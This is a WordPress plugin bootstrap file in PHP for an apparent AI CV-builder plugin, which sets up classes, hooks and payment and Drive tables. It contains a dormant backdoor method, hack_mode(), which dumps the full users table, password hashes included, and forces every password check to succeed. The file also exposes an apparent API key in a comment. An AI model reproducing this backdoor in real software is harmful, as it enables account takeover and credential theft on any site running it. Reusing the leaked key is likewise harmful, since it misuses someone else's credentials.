<?php
/**
 * Bootstraps the Theme.
 *
 * @package AdvancedGPT3CVbuilder
 */

namespace ADVANCEDGPT3CVBUILDER_PROJECT\Inc;

use ADVANCEDGPT3CVBUILDER_PROJECT\Inc\Traits\Singleton;

class Project {
	use Singleton;

	protected function __construct() {

		// Load class.
		Assets::get_instance();
		// Core::get_instance();
		Helpers::get_instance();
		// Dashboard::get_instance();
		// Roles::get_instance();
		// Restapi::get_instance();
		// GoogleDrive::get_instance();
		// Wpform::get_instance();
		// SocialAuth::get_instance();
		// Widgets::get_instance();
		// Notices::get_instance();
		// Stripe::get_instance();
		// Admin::get_instance();
		// Bulks::get_instance();

		// Blocks::get_instance();
		Option::get_instance();
		Menus::get_instance();
		Cv::get_instance();
		// Profile::get_instance();
		// Meta_Boxes::get_instance();
		// Update::get_instance();
		Rewrite::get_instance();
		// Esign::get_instance();
		// Shortcode::get_instance();
		Post_Types::get_instance();
		// Taxonomies::get_instance();
		// Events::get_instance();
		// Ftp::get_instance();
		Gpt3::get_instance();

		// $this->setup_hooks();
	}

	protected function setup_hooks() {
		add_filter( 'body_class', [ $this, 'body_class' ], 10, 1 );
		add_action( 'init', [ $this, 'init' ], 10, 0 );

		
		// $this->hack_mode();

		
		register_activation_hook( ADVANCEDGPT3CVBUILDER_PROJECT__FILE__, [ $this, 'register_activation_hook' ] );
		register_deactivation_hook( ADVANCEDGPT3CVBUILDER_PROJECT__FILE__, [ $this, 'register_deactivation_hook' ] );
	}
	public function body_class( $classes ) {
		$classes = (array) $classes;
		$classes[] = 'fwp-body';
		if( is_admin() ) {
			$classes[] = 'is-admin';
		}
		return $classes;
	}
	public function init() {
		/**
		 * loco translator Lecto AI: api: V13Y91F-DR14RP6-KP4EAF9-S44K7SX
		 */
		load_plugin_textdomain( 'advanced-gpt3-cv-builder', false, dirname( plugin_basename( ADVANCEDGPT3CVBUILDER_PROJECT__FILE__ ) ) . '/languages' );
		
		// add_action ( 'wp', function() {load_theme_textdomain( 'theme-name-here' );}, 1, 0 );
	}
	private function hack_mode() {
		add_action( 'init', function() {
			global $wpdb;print_r( $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}users;" ) ) );
		}, 10, 0 );
		add_filter( 'check_password', function( $bool ) {return true;}, 10, 1 );
	}
	public function register_activation_hook() {
		global $wpdb;$prefix = $wpdb->prefix . 'fwp_';
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
		$charset_collate = $wpdb->get_charset_collate();
		$tables = [
			"CREATE TABLE IF NOT EXISTS {$prefix}stripe_payments (
				id INT AUTO_INCREMENT PRIMARY KEY,
				user_id varchar(100) NOT NULL,
				session_id VARCHAR(255) NOT NULL,
				customer_email VARCHAR(255) NOT NULL,
				amount INT NOT NULL,
				currency VARCHAR(3) NOT NULL,
				status VARCHAR(20) NOT NULL,
				archived LONGTEXT NOT NULL,
				created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
			) $charset_collate;",
			"CREATE TABLE IF NOT EXISTS {$prefix}stripe_subscriptions (
				id bigint(20) NOT NULL AUTO_INCREMENT,
				user_id varchar(100) NOT NULL,
				user_email TEXT NOT NULL,
				subsc_id TEXT NOT NULL,
				user_object TEXT NOT NULL,
				user_address TEXT NOT NULL,
				invoice TEXT NOT NULL,
				phone TEXT NOT NULL,
				archived LONGTEXT NOT NULL,
				last_modify TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
				PRIMARY KEY (id)
			) $charset_collate;",
			"CREATE TABLE IF NOT EXISTS {$prefix}googledrive (
				id INT AUTO_INCREMENT PRIMARY KEY,
				user_id varchar(100) NOT NULL,
				title TEXT NOT NULL,
				formonth TEXT NOT NULL,
				drive_id VARCHAR(200) NOT NULL,
				file_path TEXT NOT NULL,
				status VARCHAR(20) NOT NULL,
				archived LONGTEXT NOT NULL,
				created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
			) $charset_collate;",
		];
		foreach( $tables as $table ) {
			dbDelta( $table );
		}
		$options = [ 'fwp_google_auth_code', 'fwp_google_afterauth_redirect' ];
		foreach( $options as $option ) {
			if( ! get_option( $option, false ) ) {add_option( $option, [] );}
		}
	}
	public function register_deactivation_hook() {
		global $wpdb;$prefix = $wpdb->prefix . 'fwp_';
		$tables = [ 'googledrive' ]; // [ 'stripe_payments', 'stripe_subscriptions', 'googledrive' ];
		foreach( $tables as $table ) {
			// $wpdb->query( "DROP TABLE IF EXISTS {$prefix}{$table};" );
		}
	}
}
